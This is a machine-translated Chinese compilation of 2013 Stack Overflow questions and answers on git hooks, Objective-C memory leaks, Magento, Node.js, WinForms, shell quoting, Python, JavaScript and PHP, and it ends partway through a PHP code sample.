如果您将以下脚本作为`hooks/post-receive`挂钩添加到裸 git 存储库`foo.git`：

```
#!/bin/sh
GIT_WORK_TREE=/bar git checkout -f 
```

然后每当有人推送到存储库时，当前状态将在目录中更新`bar`。

这要求`bar`和`foo.git`必须在同一台机器上。

修改它以便在远程机器上进行结帐的最简单方法是什么（比如说`baz:/bar`）？

一种方法是：

```
#!/bin/sh
GIT_WORK_TREE=/tmp/bar git checkout -f
rsync ... /tmp/bar baz:/bar 
```

有没有更好的办法？也许不需要中间临时目录？（如果不是，传递给 rsync 以使生成的目录与直接签出相同的正确选项是什么？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T06:48:22.727

`GIT_WORK_TREE=/bar`意味着这`bar`是一个 git repo。

如果`bar`是远程端的 git 存储库，那么它可以从裸存储库`bare_bar.git`（也在远程端）中提取，您可以推送到该存储库。

换句话说，您的`post-receive`钩子将通过 ssh 推送到 bare_bar 存储库，并且`post-receive`该裸存储库上的钩子将触发从实际存储库中的拉取`bar`：请参阅“[从生产文件夹创建 git 存储库](https://stackoverflow.com/a/11724354/6309)”。

* * *

> 我更喜欢使远程服务器不受任何 .git 目录（理想情况下甚至是 git 包本身）的解决方案

在这种情况下，您当前的 post-receive 钩子及其`rsync`命令似乎是将新数据*增量*复制到远程工作树的唯一方法。

*   [`git archive`](http://git-scm.com/docs/git-archive)每次都会存档所有内容。
*   [`git bundle`](http://git-scm.com/docs/git-bundle)另一边需要 git。

# iphone - MutableCopy AllocLeak MemoryLeak

> ID：14469258
> 
> 赞同：0
> 
> 时间：2013-01-22T22:29:44.470
> 
> 标签：iphone, ios, objective-c, memory-management, nsmutablecopying

我有一个每秒触发一次的 NSTimer。

每一秒我都有一个需要更改的 NSString 。

我以前从未尝试过处理内存管理，所以我不确定我所做的是否正确，但仪器在“alloc”下说`stringByReplacingOccurrencesOfString`大约一分钟后代码行有 45MB 的“Live Bytes” ...

（并且实时字节数每秒都在增加，最终导致应用程序崩溃）。

我认为我的问题在于`MutableCopy`代码的某个地方？

这是我的代码：

```
-(void)myTimer {
    if (testedit) {
        [testedit release];
        [withString1a release];
        [forString1a release];
    }
    testedit = [[NSString alloc] init];
    withString1a = [[NSString alloc] init];
    forString1a = [[NSString alloc] init];

    testedit = [[NSString alloc] initWithFormat:@"example"];
    withString1a = [[NSString alloc] initWithFormat:@"e"];//this string gets its values randomly from an array in my real code
    forString1a = [[NSString alloc] initWithFormat:@"flk34j"];//this string gets its values randomly from an array in my real code

    testedit = [[testedit stringByReplacingOccurrencesOfString:withString1a withString:forString1a]  mutableCopy];//memory leak /:

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:37:07.693

您为每个对象分配了两次内存。当您第二次分配并将其分配给同一个变量时，分配的第一块内存变得不可访问且不可释放。

然后你制作一个 testit 的 mutableCopy 并将副本分配给原始变量。再一次，你留下了一块无法访问的内存。

非 ARC 内存管理的规则是 - 对于每个**alloc**、**new**、**copy**或**retain**，您需要有一个相应的**release**。你有 6 个分配器，一个副本，只有 3 个版本。

这里有一些建议。

删除这些重复的分配：

```
 testedit = [[NSString alloc] init];
   withString1a = [[NSString alloc] init];
   forString1a = [[NSString alloc] init]; 
```

大概`testedit`，`withString1a`并且`forString1a`都是 iVar。（[请将您的 iVar 声明为自动合成的属性](https://stackoverflow.com/questions/14236799/should-i-declare-variables-in-interface-or-using-property-in-objective-c-arc/14236931#14236931)，并将它们称为 self.testedit ... 等，这将使您的代码对堆栈溢出器更加清晰）。

取出所有这些：

```
if (testedit) {
        [testedit release];
        [withString1a release];
        [forString1a release];
    } 
```

假设这些都是 iVar，释放它们的正确位置是在对象的`dealloc`方法中

实际上`withString1a`，并且`forString1a`可以是局部变量，因为您从其他地方获取它们的内容：

```
 NSString*  withString1a = [[[NSString alloc] initWithFormat:@"e"] autorelease];
 NSString*  forString1a =  [[[NSString alloc] initWithFormat:@"flk34j"] autorelease]; 
```

您可以`autorelease`使用它们，因为在方法完成后您不需要它们闲逛。

这些行也可以写成：

```
 NSString*  withString1a = [NSString stringWithFormat:@"e"];
 NSString*  forString1a =  [NSString stringWithFormat:@"flk34j"]; 
```

（-stringWithFormat 是一种返回自动释放对象的便捷方法）

这给我们留下了这两行。

```
 testedit = [[NSString alloc] initWithFormat:@"example"];
  testedit = [[testedit stringByReplacingOccurrencesOfString:withString1a 
                                                  withString:forString1a]  mutableCopy]; 
```

目前尚不清楚为什么您将 testit 视为第一行中的不可变字符串和第二行中的可变字符串。您根本不需要可变字符串，因为您要替换`testedit`为新字符串。

```
 self.testedit = [[NSString alloc] initWithFormat:@"example"];
 self.testedit = [[testedit stringByReplacingOccurrencesOfString:withString1a 
                                                  withString:forString1a] copy]; 
```

（你需要`copy`作为`stringByReplacingOccurrencesOfString:withString:`返回一个自动释放的对象，在这里你想保留它）

拼图的最后一块是摆脱您的 _testedit iVar 内存分配。您可以在`dealloc`对象的方法中执行此操作：

```
- (void) dealloc {
    [_testEdit release];
    [super dealloc];
} 
```

（请注意`init`，访问器和方法是*不应*使用属性语法引用 iVar`dealloc`的三个地方。）

 *一切都很好，但实际上，您应该使用 ARC！与依靠编译器为您管理内存相比，您更有可能以这种方式引入内存错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:01:51.890

我建议你利用`@property`这里。

在 .h 文件中将属性声明为：

```
@property (nonatomic, retain) NSString *testedit;
@property (nonatomic, retain) NSString *withString1a;
@property (nonatomic, retain) NSString *forString1a; //if required write the @synthesize as well in .m class 
```

您可以将计时器方法编写为：

```
-(void)myTimer {

    self.testedit = @"example";
    self.withString1a = @"e";//this string gets its values randomly from an array in my real code
    self.forString1a = @"flk34j";//this string gets its values randomly from an array in my real code
    self.testedit = [self.testedit stringByReplacingOccurrencesOfString:self.withString1a withString:self.forString1a];
} 
```

在 dealloc 方法中，您可以将上述所有属性设置为`nil`( `self.testedit = nil;`) 或对其进行释放 ( `[testedit release];`)。

如果可能，尝试切换到 ARC，您不必担心内存管理。您的代码的问题是您使用了很多 alloc/init 语句而没有在执行之前释放变量。这会导致它丢失该变量的引用，并且您将泄漏它。您不需要那么多分配语句。对于每个分配或保留，都应该有相应的释放/自动释放语句。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:38:00.037

你得到了内存泄漏，因为你从来没有 de-allocate `testedit`。每当您调用 alloc 时，这意味着您需要释放它。这通常意味着调用`release`.

改为这样做，然后确保释放您分配的内存：

```
NSString* newString = [[testedit stringByReplacingOccurrencesOfString:withString1a withString:forString1a]  mutableCopy]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:44:35.233

如果您使用的是 ARC，则应该没有问题。如果您不使用 ARC，您可以尝试添加`autorelease`：

```
testedit = [[[testedit stringByReplacingOccurrencesOfString:withString1a withString:forString1a]  mutableCopy] autorelease]; 
```*

# php - Magento：无法捕获已调度的事件

> ID：14469261
> 
> 赞同：0
> 
> 时间：2013-01-22T22:29:53.237
> 
> 标签：php, events, magento, observers

为了开发基于付款方式和事件类型的自动订单状态更改器，我创建了以下模块：

/GT/OrderFlo/etc/config.xml

```
 <!--?xml version="1.0"?-->
<config>
    <modules>
        <gt_orderflow>
            <version>1.0</version>
        </gt_orderflow>
    </modules>

    <global>

        <models>            
            <orderflow>
                <class>GT_OrderFlow_Model</class>
            </orderhook>
        </models>

        <events>
            <sales_order_place_after>
                <observers>
                    <order_payment_pending_autostatus>
                        <type>singleton</type>
                        <class>orderflow/observer</class>
                        <method>implementOrderStatus</method>
                    </order_payment_pending_autostatus>
                </observers>
            </sales_order_place_after>
            <sales_order_shipment_save_after>
                <observers>
                    <order_invoice_pending_autostatus>
                        <type>singleton</type>
                        <class>orderflow/observer</class>
                        <method>implementOrderStatus</method>
                    </order_invoice_pending_autostatus>
                </observers>
            </sales_order_shipment_save_after>
            <sales_order_invoice_save_commit_after>
                <observers>
                    <order_complete_autostatus>
                        <type>singleton</type>
                        <class>orderflow/observer</class>
                        <method>implementOrderStatus</method>
                    </order_complete_autostatus>
                </observers>
            </sales_order_invoice_save_commit_after>                        
        </events>

    </global>
</config> 
```

/GT/OrderFlow/Model/Observer.php

```
class GT_OrderFlow_Model_Observer
{
public function implementOrderStatus($event)
{
    $order = $event->getOrder();
    $payment_method = $this->_getPaymentMethod($order);
    $this->_log('In implementOrderStatus with payment method: '.$payment_method);
    Mage::log('In implementOrderStatus with payment method: '.$payment_method);
    $next_status = "";
    return $this;
}

private function _getPaymentMethod($order)
{
    return $order->getPayment()->getMethodInstance()->getCode();
}

private function _log($message)
{
    return Mage::log($message, null, 'gt_orderflow.log');
}
} 
```

[该代码是从http://www.atwix.com/magento/auto-invoice-and-custom-order-status-upon-checkout/](http://www.atwix.com/magento/auto-invoice-and-custom-order-status-upon-checkout/)复制而来的。

但是我怎样才能让它在`sales_order_place_after`事件发生后解雇观察者呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:02:59.237

您的模块是否已加载？您将需要一个文件在`/app/etc/modules`. 在相关说明中，我看到您将模块称为`<gt_orderflow>`但类前缀是`GT_OrderFlow`. 在区分大小写的文件系统上，这很重要，不会以这种方式工作。下面的节点`config/modules`映射到模块路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:53:53.150

我认为你有一个错字

```
<models>             
    <orderflow>  
    -----^
        <class>GT_OrderFlow_Model</class>
    </orderhook>
    -----^
</models> 
```

# node.js - MAC 上的 Node.js：从另一台计算机访问 Node.js Web 服务器

> ID：14469267
> 
> 赞同：25
> 
> 时间：2013-01-22T22:30:30.630
> 
> 标签：node.js

我使用 Node.js 的众所周知的 http-web-server-example 在我的计算机上构建了一个 Node.js Web 服务器：

```
var http = require('http');

http.createServer(function(req, res){
    res.writeHead(200, {'content-type': 'text/plain'});
    res.end('It works');
}).listen(3000, '127.0.0.1'); 
```

这在运行服务器的计算机上（如预期的那样）有效。

我想从同一局域网中的另一台计算机访问服务器。`ifconfig`在运行服务器（Apple MacOSX）的计算机终端上使用，我得到： `192.168.0.6`.

所以，在我的另一台电脑上，我打开浏览器并连接到`http://192.168.0.6:3000`，但我得到：

```
Oops! Google Chrome could not connect to 192.168.0.6:3000 
```

我的最终目标是能够使用我的智能手机连接到服务器。

欢迎任何帮助。如有必要，请随时询问更多详细信息。

提前致谢 ：）

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2013-01-22T22:33:09.863

`127.0.0.1`只是本地接口。尝试开始监听所有接口：

```
var http = require('http');

http.createServer(function(req, res){
    res.writeHead(200, {'content-type': 'text/plain'});
    res.end('It works');
}).listen(3000, '0.0.0.0'); 
```

# scala - 来自 Scala 类的 Clojure ISeq

> ID：14469274
> 
> 赞同：6
> 
> 时间：2013-01-22T22:30:56.227
> 
> 标签：scala, clojure

我有一堆 Scala 类（如 Lift 的 Box、Scala 的 Option 等），我想在 Clojure 中将它们用作 Clojure ISeq。

我如何告诉 Clojure 如何将这些类变成一个 ISeq，以便所有各种与序列相关的函数“正常工作”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T22:06:57.227

为了建立亚瑟的答案，您可以在 Scala 中提供一个通用包装类，如下所示：

```
class WrapCollection(repr: TraversableOnce[_]) extends clojure.lang.Seqable { ... } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T23:33:46.510

如果类实现了`Iterable`接口，那么你可以调用`seq`它们来获得一个序列。`first`序列库中的大多数函数都会为您执行此操作，因此在几乎所有正常情况下，您都可以像`count`原样将它们传递给 seq 函数。

# apache-flex - 在数据绑定中将值从 int 传递到字符串，反之亦然 (Flex 4)

> ID：14469280
> 
> 赞同：0
> 
> 时间：2013-01-22T22:31:21.073
> 
> 标签：apache-flex, flex4.5, flexbuilder

我有一项服务，其中数据为字符串格式，在我的表单中，我有一个 NumericStepper，其值为整数。问题是我需要使用保留值的 DataType 对象进行双向数据绑定。

有什么办法可以解析这个值吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T05:28:13.597

只需使用转换为适当的类型，这是一个绑定 textInput 的字符串值的示例：

```
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx">
    <s:VGroup>
        <s:NumericStepper id="stepper" />
        <s:TextInput id="input" text="{data}" change="{data = input.text}"/>
    </s:VGroup>

    <fx:Binding source="String(stepper.value)" destination="data"/>
    <fx:Binding source="int(data)" destination="stepper.value"/>

    <fx:Script>
        <![CDATA[

            [Bindable]
            public var data:String = "0";

        ]]>
    </fx:Script>
</s:Application> 
```

UPD：通过 fx:Binding 标签添加了双向数据绑定。所以，stepper.value 绑定在 data 属性上，而 data 属性绑定 stepper.value。示例中的 TextInput 更改数据属性以进行测试。

# ios - 如何测试您的 iOS 应用程序在内存警告方面是否表现良好？

> ID：14469288
> 
> 赞同：5
> 
> 时间：2013-01-22T22:32:15.073
> 
> 标签：ios, ios-simulator, didreceivememorywarning

我最近注意到，有时我们的应用程序在收到内存警告后会立即崩溃。在设备上重现此问题非常困难，即使在模拟器中，我也可能在“模拟内存警告”的十次尝试之一中遇到此崩溃。

什么是调试内存警告处理程序的好策略，考虑到问题通常来自“太晚”到达的回调、在警告处理程序中被销毁后意外使用的资源等？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T22:32:15.073

这是一种帮助我在内存警告处理程序中发现几个严重错误的方法。

首先，我进入 OS X 键盘设置并为**模拟内存警告**分配了一个快捷方式：

![在此处输入图像描述](../Images/12958ba9491b1cd52753685428002175.png)

然后，在模拟器中运行应用程序时，我一直按住这些按钮，**因此模拟器每秒会生成数十个内存警告**。在这样做的同时，我会绕过应用程序。当然，这在现实世界中很少发生，但这种压力测试有助于揭示一些同步、回调和状态问题，否则我不会发现这些问题。

# c# - 最小化应用程序表单会导致模式表单关闭，但不会关闭 MessageBox

> ID：14469289
> 
> 赞同：4
> 
> 时间：2013-01-22T22:32:15.387
> 
> 标签：c#, winforms

如果我在打开模式对话框时以编程方式最小化应用程序的表单，则该模式对话框将关闭。

但是，如果我在 MessageBox 打开时以编程方式最小化应用程序的窗体，则 MessageBox 不会关闭（即，当我将应用程序恢复到正常窗口状态时，消息框仍然显示）。

这是我展示差异的示例代码：

```
 public partial class Form1 : Form
    {
        // ... 

        private void showMessageBoxBtn_Click(object sender, EventArgs e)
        {
            timer1.Start();

            // This MessageBox does *not* get closed when the WindowState of Form1 is set to minimized in timer1_Tick
            MessageBox.Show(this, "MessageBox");
        }

        private void formShowDialogBtn_Click(object sender, EventArgs e)
        {
            timer1.Start();

            // This form gets closed when the WindowState of Form1 is set to minimized in timer1_Tick
            Form2 form2 = new Form2();
            form2.ShowDialog(); 
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            timer1.Stop();
        }
    } 
```

**问题：**

有没有办法让表单表现得像 MessageBox？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-25T00:11:59.443

您所看到的是 Winforms 内置的应对对话框可用性问题的对策的副作用，MessageBox() 函数没有的对策。它们可能与 Windows 98 更相关，Windows 98 最初是 Winforms 的一个重要目标操作系统，太久以前我无法准确记住。

一个重要的可用性问题是当你显示一个对话框并且它被最小化时会发生什么。对话框会禁用应用程序中的所有其他窗口，因此您无法再激活它们。该对话框应将其 ShowInTaskbar 属性设置为 false。用户现在有一个问题，没有简单的方法可以返回对话框。没有什么可点击的。

Winforms 通过自动关闭对话框来避免这个陷阱。如您所知，MessageBox 不会这样做。它也不能合理地做到这一点，它没有返回“对话已取消”状态代码的好方法。

值得注意的是，这个陷阱仍然部分存在。在我的 Win8 机器上，我可以单击禁用表单的任务栏按钮并让它回到前台。但这会激活禁用的表单而不是消息框。如果消息框在该表单后面，那么主要的 UI 会令人讨厌。

所以回答你的问题：不。功能，而不是错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-25T07:50:39.853

首先，`Form2`在方法范围之外声明表单变量，以便可以从`timer1_tick`方法中访问它。然后，当`Timer`勾选时，最小化主窗体，但显示模态对话框，然后将其最小化。

尝试这个：

```
Form2 form2;

private void timer1_Tick(object sender, EventArgs e)
{
    WindowState = FormWindowState.Minimized;
    form2.Show();
    form2.WindowState = FormWindowState.Minimized;
    timer1.Stop();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-07T02:16:43.823

如果你设置

```
Visible = true; 
```

在以编程方式最小化所有者后立即在模态表单上，模态表单不会被操作系统杀死。

所以

```
ownerForm.WindowState = FormWindowState.Minimized; 
```

将杀死模态形式。但

```
ownerForm.WindowState = FormWindowState.Minimized;
modalForm.Visible = true; 
```

不会杀死它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-23T02:58:42.770

马特，

尝试改变：

```
form2.ShowDialog(); 
```

至

```
form2.Show(this); 
```

这是您正在寻找的行为吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-25T14:08:22.827

你可以尝试这样的事情：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace WindowsFormsApplication37
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        [DllImport("user32.dll", ExactSpelling = true, CharSet = CharSet.Auto)]
        public static extern IntPtr GetParent(IntPtr hWnd);

        Form2 form2 = null;
        IntPtr parent = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent();
        }

        private void formShowDialogBtn_Click(object sender, EventArgs e)
        {
            timer1.Start();

            // This form gets closed when the WindowState of Form1 is set to minimized in timer1_Tick
            form2 = new Form2();
            form2.ShowDialog();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            timer1.Stop();
        }

        private void Form1_Resize(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.parent = GetParent(form2.Handle);
                SetParent(form2.Handle, IntPtr.Zero);
                form2.Hide();
            }
            else
            {
                SetParent(form2.Handle, this.parent);
                form2.ShowDialog();
            }
        }
    }
} 
```

请注意，这有点像黑客，我不完全确定后果。批评是可以接受的:)

# python - python中的版本控制模块丢失

> ID：14469292
> 
> 赞同：0
> 
> 时间：2013-01-22T22:32:18.727
> 
> 标签：python

当我编译 s3cmd 时，我发现缺少版本控制模块，堆栈跟踪为：

```
Traceback (most recent call last):
  File "./s3cmd", line 1983, in <module>
    from S3.S3 import S3
  File "/home/chutong/s3cmd.svn/S3/S3.py", line 29, in <module>
    from Versioning import Versioning
ImportError: No module named Versioning 
```

我试着上网查了一下，没有多少资源？有人可以帮忙吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:38:08.307

我刚刚在 github 上查看[了 s3cmd 的源代码。](https://github.com/s3tools/s3cmd)它似乎不再导入此模块，也不再在其代码树中包含名为 Versioning 的模块。

如果没有更多信息，我无法判断，但我怀疑您的版本不匹配，可能一个版本安装在您的 Python 环境中，而另一个版本安装在本地。

它从 SVN 目录引发异常有点奇怪，但就像我说的那样，需要有关您的执行环境的更多信息才能取得进展。诸如当前目录、sys.path 的转储之类的东西。

但如果可能的话，您可以尝试更新已安装的版本并重试。自您使用的版本以来，该库似乎已进行了一些重大更新。

# javascript - 将 setTimeout 添加到带有回调的函数的语法

> ID：14469294
> 
> 赞同：0
> 
> 时间：2013-01-22T22:32:39.693
> 
> 标签：javascript, google-maps-api-3, asynchronous, syntax, settimeout

我正在尝试使以下“我将在 x 英里内向这些目标地点行驶的地方”异步功能（效果很好）也在执行之间等待。谷歌地图过程对速度有限制，在“Over_Query_limit”开始绘制地图之前，我可以绘制的路线多于 10 条。

我知道服务条款（2500/天），我不会违反它们。

它位于一个循环中，其中包含来自中心点（pt）的所需目的地（endPoints）数组，请问实现这一点的语法是什么？我在这个网站和其他网站上阅读了很多，并且可以看到该函数应该放在引号中，但是通过异步调用我看不出如何。

你可以看到我糟糕的尝试（注释掉）

```
var delay=100;
for (var i = 0; i < endPoints.length; i++) {
    //setTimeout(function() {
        howfar(pt,endPoints[i],i,function(i,status,endPoint) {
            //process results
        });
    //},delay;
}

function howfar(from,to,i,callback) {
    //get the endpoint from the directions service
    callback.call({},i,status,endPoint);
} 
```

一如既往地感谢您的关注和帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:45:50.793

If I understood your question correctly, you need to wait until the `howfar` function returns plus a fixed delay, and only then process the next `endPoint` in the array?

I typically setup an iterator function which schedules itself until there are no more items to be processed. Something like:

```
var delay = 100;
var i = 0;
//define a helper function
var measureNext = function() {

   howfar(pt, endPoints[i], i, function(i,status,endPoint) {
     //process results

     //if there are still unprocessed items in the array, schedule
     //the next after {delay} milliseconds
     if(i++ < endPoints.length) {
       setTimeout(measureNext, delay);
     }
   });

};

//start with the first argument
measureNext(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:36:43.897

确切的语法如下所示：

```
var delay = 100; // in milliseconds, 100 is a tenth of a second
setTimeout(function() {
    howfar(pt,endPoints[i],i, function(i,status,endPoint) {
        //process results
    });
}, delay); 
```

不过，一个快速的谷歌会发现这一点。

# javascript - 用于验证字符串的 JavaScript 或 jQuery 正则表达式方法和语句是 yyyy-mm-dd，其中之一是 hh:mm AM/PM

> ID：14469295
> 
> 赞同：0
> 
> 时间：2013-01-22T22:32:48.243
> 
> 标签：javascript, jquery, regex

我不擅长正则表达式，所以我什至不会假装。我想要做的是验证一个字符串是否为数字并采用以下格式`yyyy-mm-dd`，另一个类似但时间`hh:mm AM/PM`

在谷歌上我能找到的最好的尝试是 for `mm-dd-yyyy`, `mm/dd/yyyy`.

那么任何人都可以在这里为我需要的两种模式提供帮助吗？将模式与字符串进行比较的最佳方法是什么？是它`.test()`还是`.match()`别的什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:40:18.330

这是日期：

```
/^[0-9]{4}-(((0[13578]|(10|12))-(0[1-9]|[1-2][0-9]|3[0-1]))|(02-(0[1-9]|[1-2][0-9]))|((0[469]|11)-(0[1-9]|[1-2][0-9]|30)))$/.test(date); 
```

这是时间：

```
/^([1-9]|1[0-2]|0[1-9]){1}(:[0-5][0-9] [AP][M]){1}$/.test(time); 
```

**REF：**从谷歌的[第一个](http://regexlib.com/DisplayPatterns.aspx?cattabindex=4&categoryId=5)结果开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:50:36.213

我不知道这是否有帮助，但自从我尝试过[momentjs 之后](http://momentjs.com/)，我从来没有遇到过日期问题，这绝对值得一看。

# shell - 为什么我的引号在我的 shell 脚本中被忽略

> ID：14469299
> 
> 赞同：0
> 
> 时间：2013-01-22T22:33:03.437
> 
> 标签：shell, scripting, freebsd

我正在尝试在 FreeBSD 的 /bin/sh 中编写一个安装 shell 脚本。

> DialogOptions='--trim --ok-label "Next" --backtitle "Workstation Installer"'
> 
> 对话框 $DialogOptions --max-input 4 --cancel-label "Abort" --inputbox "输入内容"

以上退出并出现错误

> 错误：未知选项安装程序。

我认为当我将 DialogOptions 变量传递给对话框时，它会以不同的方式解释引号。我不知道为什么会这样。

我还注意到 ok 标签显示“Next”而不是 Next。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:43:47.000

就*shell*而言，它的行为应该完全符合您的预期：

```
$ DialogOptions='--trim --ok-label "Next" --backtitle "Workstation Installer"' 
```

此时，变量“DialogOptions”包含单个字符串

```
$ echo ..$DialogOptions..
..--trim --ok-label "Next" --backtitle "Workstation Installer".. 
```

echo 命令看到*五个*参数：--trim、--ok-label、“Next”--backtitle 和“Workstation Installer”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:15:33.683

为了做你想做的事，你需要使用一个数组，这将使你引用的参数保持不分裂：

```
DialogOptions=(--trim --ok-label "Next" --backtitle "Workstation Installer")
dialog "${DialogOptions[@]}" --max-input 4 --cancel-label "Abort" --inputbox "Enter stuff" 
```

您还需要使用支持数组的 shell：bash/ksh/zsh。否则，您必须使用`eval`：

```
DialogOptions='--trim --ok-label Next --backtitle "Workstation Installer"'
eval "dialog $DialogOptions --max-input 4 --cancel-label Abort --inputbox \"Enter stuff\"" 
```

请注意，您不必引用不包含任何字符的*字符串*`$IFS`

# python - 有多余字符时在 Python 列表中进行匹配

> ID：14469306
> 
> 赞同：1
> 
> 时间：2013-01-22T22:34:22.607
> 
> 标签：python, sorting, matching

我正在尝试编写一个 python 代码来匹配 python 中两个列表中的内容。

一个制表符分隔的文件如下所示：

`COPB2`

`KLMND7`

`BLCA8`

如果你愿意的话，另一个文件 2 有一长串看起来相似的“名字”。文件中应该有一些相同的匹配项，我已成功识别并写入新文件。问题是当“名称”之一的末尾有其他字符时。例如，`COPB2`从上面应该匹配`COPB2A`file2，但它不匹配。同样`KLMND7`应该匹配`KLMND79`。我应该使用正则表达式吗？把它们变成字符串？任何想法都有帮助，谢谢！

在下面看到的第一个响应之后，我到目前为止所做的工作：

```
with open(in_file1, "r") as names:
for line in names:
    file1_list = [i.strip() for i in line.split()]
    file1_str = str(file1_list)

with open(in_file2, "r") as symbols:
for line in symbols:
    items = line.split("\t")
    items = str(items)
    matches = items.startswith(file1_str)
    print matches 
```

`False`当我知道应该有一些匹配时，此代码会返回。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:36:37.523

`string.startswith()`不需要正则表达式，如果它只是尾随字符

```
>>> g = "COPB2A"
>>> f = "COPB2"
>>> g.startswith(f)
True 
```

这是一段工作代码：

```
file1_list = []
with open(in_file1, "r") as names:
    for line in names:
        line_items = line.split()
        for item in line_items:
            file1_list.append(item)

matches = []
with open(in_file2, "r") as symbols:
    for line in symbols:
        file2_items = line.split()
        for file2_item in file2_items:
            for file1_item in file1_list:
                if file2_item.startswith(file1_item):
                    matches.append(file2_item)
                    print file2_item
print matches 
```

大文件可能会很慢。如果无法接受，我可以尝试考虑如何优化它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:48:00.913

如果您需要更通用的解决方案，您可以查看 difflib。请记住，这是一个很大的导入，开销很大，所以只有在你真的需要时才使用它。这是另一个有点相似的问题。

[https://stackoverflow.com/questions/1209800/difference-between-two-strings-in-python-php](https://stackoverflow.com/questions/1209800/difference-between-two-strings-in-python-php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:55:05.627

假设您将文件加载到列表 X、Y 中。

```
## match if a or b is equal to or substring of one another in a case-sensitive way
def Match( a, b):
    return a.find(b[0:min(len(a),len(b))-1])

common_words = {};
for a in X:
    common_words[a]=[];
    for b in Y:
        if ( Match( a, b ) ):
             common_words[a].append(b); 
```

如果要使用正则表达式进行匹配，则要使用“单词匹配开头”运算符“^”。

```
import re
def MatchRe( a, b ):        
    # make sure longer string is in 'a'.
    if ( len(a) < len(b) ):
         a, b = b, a;
    exp = "^"+b;
    q = re.match(exp,a);
    if ( not q ):
       return False; #no match
    return True; #access q.group(0) for matches 
```

# php - SQL 多查询 - 太重？

> ID：14469307
> 
> 赞同：3
> 
> 时间：2013-01-22T22:34:23.600
> 
> 标签：php, mysql

我一直在编写一个新仪表板，我想在其中显示各种数据库统计信息，主要是计算行数并将结果设置为变量，它们都可以正常工作，但我有点担心如果有这么多 SELECT 查询可能会变得太重很多用户正在进入或刷新页面。

感谢您的意见:)

```
$tbl_players = players;

$xbox = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'XBOX360'");
$ps3 = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'PS3'");
$pc = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'PC'");
$xbfa = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'XBOX360' && fathread LIKE 'http%'");
$psfa = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'PS3' && fathread LIKE 'http%'");
$pfa = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'PC' && fathread LIKE 'http%'");
$xbcr = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'XBOX360' && crthread LIKE 'http%'");
$pscr = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'PS3' && crthread LIKE 'http%'");
$pcr = mysql_query("SELECT * FROM $tbl_players WHERE Console = 'PC' && crthread LIKE 'http%'");
while($row = mysql_fetch_array($xbox))
    {
$cxbox = mysql_num_rows($xbox);
}
while($row = mysql_fetch_array($ps3))
    {
$cps3 = mysql_num_rows($ps3);
}
while($row = mysql_fetch_array($pc))
    {
$cpc = mysql_num_rows($pc);
}
while($row = mysql_fetch_array($xbfa))
    {
$xboxfa = mysql_num_rows($xbfa);
}
while($row = mysql_fetch_array($psfa))
    {
$ps3fa = mysql_num_rows($psfa);
}
while($row = mysql_fetch_array($pfa))
    {
$pcfa = mysql_num_rows($pfa);
}
while($row = mysql_fetch_array($xbcr))
    {
$xboxcr = mysql_num_rows($xbcr);
}
while($row = mysql_fetch_array($pscr))
    {
$ps3cr = mysql_num_rows($pscr);
}
while($row = mysql_fetch_array($pcr))
    {
$pccr = mysql_num_rows($pcr);
}

$tbl_interactive = interactive;

$maximum = mysql_query("SELECT ID FROM $tbl_interactive ORDER BY ID DESC LIMIT 1");
while($max = mysql_fetch_array($maximum))
{
$cint = $max['ID'];
}
$xboxf = mysql_query("SELECT * FROM $tbl_interactive WHERE Console = 'XBOX360' && Type = 'Player' && $date < EndTime");
